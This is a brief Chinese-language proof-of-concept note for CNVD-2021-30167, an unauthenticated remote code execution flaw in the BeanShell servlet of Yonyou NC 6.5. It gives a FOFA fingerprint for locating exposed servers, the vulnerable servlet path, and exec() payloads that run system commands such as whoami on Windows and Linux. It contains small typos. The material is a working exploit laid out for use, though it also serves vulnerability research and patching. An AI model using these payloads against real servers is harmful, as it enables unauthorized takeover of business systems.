# 用友NC BeanShell远程代码执行

编号: CNVD-2021-30167

影响版本: NC6.5

fofa指纹: icon_hash="1085941792"

该漏洞是由于用友NC对外开放了BeanShell接口，攻击者可以在未授权的情况下直接访问该接口，并构造恶意数据执行任意代码并获取服务器权限。

POC：
```bash
# get
/servlet/~ic/bsh.servlet.BshServlet
```

eg:
```bash
exec("whomai")
exec("cmd /c whoami")
exec("/bin/sh whoami")
```

注：该脚本中的命令执行, 仅适用于Windoes, Linux请手动测试。

![image-20210604183648070](https://oss.zjun.info/zjun.info/20210604183654.png)